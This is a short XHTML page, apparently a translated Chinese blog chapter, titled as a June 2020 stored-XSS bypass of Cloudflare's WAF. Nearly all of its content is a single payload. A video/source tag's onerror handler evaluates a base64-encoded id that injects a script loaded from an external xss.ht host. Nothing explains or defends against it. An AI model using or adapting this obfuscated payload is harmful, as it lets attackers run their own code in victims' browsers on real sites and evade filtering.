@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>存储型XSS Cloudflare WAF旁路（2020年6月）</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>存储型XSS Cloudflare WAF旁路（2020年6月）</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzAxMjYyMzkwOA==&amp;mid=2247487534&amp;idx=1&amp;sn=65fa19ceb5b2d4b6ea4b5f9407447fe8&amp;chksm=9bae5965acd9d073778e80e52caaeaffbf0d9bb1f3e68a243bf1cec911e06947a5fa28387c3d&amp;scene=126&amp;sessionid=1681670162#rd">http://mp.weixin.qq.com/s?__biz=MzAxMjYyMzkwOA==&amp;mid=2247487534&amp;idx=1&amp;sn=65fa19ceb5b2d4b6ea4b5f9407447fe8&amp;chksm=9bae5965acd9d073778e80e52caaeaffbf0d9bb1f3e68a243bf1cec911e06947a5fa28387c3d&amp;scene=126&amp;sessionid=1681670162#rd</a></blockquote><p>2020年6月存储的XSS Cloudflare WAF旁路漏洞利用：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li/></ul><pre class="code-snippet__js" data-lang="xml"><code><span class="code-snippet_outer">"&gt;<span class="code-snippet__tag">&lt;<span class="code-snippet__name">video</span>&gt;</span><span class="code-snippet__tag">&lt;<span class="code-snippet__name">source</span> <span class="code-snippet__attr">onerror</span>=<span class="code-snippet__string">eval(atob(this.id))</span> <span class="code-snippet__attr">id</span>=<span class="code-snippet__string">dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXlkaW5ueXVudXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&amp;#61;&amp;#61;</span>&gt;</span></span></code></pre></section><p style="text-align: center;"><img class="rich_pages" data-ratio="0.6" data-src="https://mmbiz.qpic.cn/mmbiz_gif/rWGOWg48tacOBNmiasarRgcWJ0A9ZYh4TeqOadzrca58awO84iciaBA0nic42viaibWGzG8icibBZQuEc6nNgMAymhaolA/640?wx_fmt=gif" data-type="gif" data-w="640" style="" src="../Images/5d50e959c113f9f00d7897149f4b645e.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_gif/rWGOWg48tacOBNmiasarRgcWJ0A9ZYh4TeqOadzrca58awO84iciaBA0nic42viaibWGzG8icibBZQuEc6nNgMAymhaolA/640?wx_fmt=gif"/></p>
+        
+</body>
+</html>
